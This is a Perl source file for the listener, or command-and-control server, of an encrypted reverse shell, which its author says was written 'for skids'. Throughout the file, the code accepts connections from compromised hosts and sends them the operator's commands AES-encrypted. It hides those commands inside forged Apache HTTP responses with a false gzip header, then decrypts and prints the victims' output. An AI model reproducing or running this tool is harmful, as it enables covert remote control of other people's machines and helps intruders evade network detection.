#!/usr/bin/perl

# AES HTTP Listener, listener.pl
# 
# (C) 2013 eor <eor[at]riseup.net>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 1, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

# This is a simple listener for my encrypted reverse shell.
# I encourage you to write your own. I spun this one up
# in less than an hour for skids. If you have something to
# offer I can provide stable listener that handles multiple
# sessions.

use Getopt::Long;
use Crypt::CBC;
use IO::Socket::INET;
use Digest::MD5 qw(md5_hex);
use MIME::Base64;

use strict;
use warnings;



sub create_response
{
    my $cipher = shift;
    my $cmd = shift;

    my $encrypted = $cipher->encrypt($cmd);
    my $encoded = encode_base64($encrypted);

    my $content_length = length($encoded);

    my $packet = "HTTP/1.1 200 OK\r\n" .
                 "Server: Apache/2.2.16 (Debian)\r\n" .
                 "Accept-Ranges: bytes\r\n" .
                 "Vary: Accept-Encoding\r\n" .
                 "Content-Encoding: gzip\r\n" .
                 "Content-Length: $content_length\r\n" .
                 "Keep-Alive: timeout=15, max=100\r\n" .
                 "Connection: Keep-Alive\r\n" .
                 "Content-Type: text/html\r\n\r\n" .
                 $encoded;

    return $packet;
}



sub do_work
{
    my $host = '0.0.0.0';
    my $port = 8080;
    my $key;

    GetOptions("host=s" => \$host,
               "port=i" => \$port,
               "key=s" => \$key);

    $key = md5_hex($key);
    my $cipher = Crypt::CBC->new(-key => $key,
                                 -cipher => "Crypt::OpenSSL::AES");

    my $sock = new IO::Socket::INET(LocalHost => $host,
                                    LocalPort => $port,
                                    Proto => 'tcp',
                                    Listen => 5,
                                    Reuse => 1)
                                    or die "! could not create socket: $!\n";

    while(1) {
        if (my $client = $sock->accept()) {
            my $peer_addr = $client->peerhost();
            print "* connection made by $peer_addr\n";

            if (!(my $pid = fork)) {
                while(1) {
                    my $cmd = <STDIN>;
                    my $response = create_response($cipher, $cmd);
                    $client->send($response);

                    my $received;
                    $client->recv($received, 1024);

                    if (length($received) == 0) {
                        close($client);
                        last;
                    }

                    my @recv_arr = split /\r\n\r\n/, $received;
                    
                    my $data = $recv_arr[1];

                    my $decoded = decode_base64($data);
                    my $decrypted = $cipher->decrypt($decoded);

                    print "$decrypted\n";

                }
            }
        }
    }
}

do_work();
